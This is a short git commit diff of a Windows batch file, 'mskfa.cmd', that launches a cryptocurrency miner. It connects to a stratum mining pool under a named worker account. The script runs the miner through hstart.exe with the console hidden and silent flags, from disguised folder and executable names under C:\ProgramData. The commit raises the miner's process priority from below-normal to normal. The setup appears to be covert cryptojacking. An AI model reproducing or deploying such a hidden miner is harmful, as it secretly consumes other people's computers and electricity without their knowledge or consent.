0af39d68e9f3cf52678ea674133cf72f7e80e122
oliverafa <oliverafa@gmail.com>
2017-07-21 22:34:18 -0300

    Update mskfa.cmd

--- mskfa.cmd
+++ mskfa.cmd
@@ -3,4 +3,4 @@
 set minuser=oliverafa.2
 set minurl=stratum+tcp://hash-to-coins.com:3333
 
-start C:\ProgramData\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\ProgramData\mskfea\mskafeb\" /BELOWNORMAL ""C:\ProgramData\mskfea\mskafeb\mskafeb.exe" -a scrypt -o %minurl% -u %minuser% -p x"
+start C:\ProgramData\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\ProgramData\mskfea\mskafeb\" /NORMAL ""C:\ProgramData\mskfea\mskafeb\mskafeb.exe" -a scrypt -o %minurl% -u %minuser% -p x"
